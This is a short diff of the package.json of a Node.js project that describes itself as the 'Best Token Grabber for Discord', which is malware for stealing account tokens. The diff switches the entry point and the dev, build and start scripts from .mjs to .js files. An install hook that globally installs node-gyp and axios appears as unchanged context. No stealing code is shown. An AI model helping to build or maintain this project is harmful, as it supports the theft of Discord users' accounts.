@@ -4,13 +4,12 @@
   "description": "Best Token Grabber for Discord.",
   "license": "MIT",
   "author": "k4itrun",
-  "type": "module",
-  "main": "./src/index.mjs",
+  "main": "./src/index.js",
   "scripts": {
     "check": "eslint . && jest",
-    "dev": "node src/test.mjs",
-    "build": "node builder.mjs",
-    "start": "node src/index.mjs",
+    "dev": "node src/test.js",
+    "build": "node builder.js",
+    "start": "node src/index.js",
     "install": "npm install -g node-gyp@latest && npm i axios@latest"
   },
   "engines": {
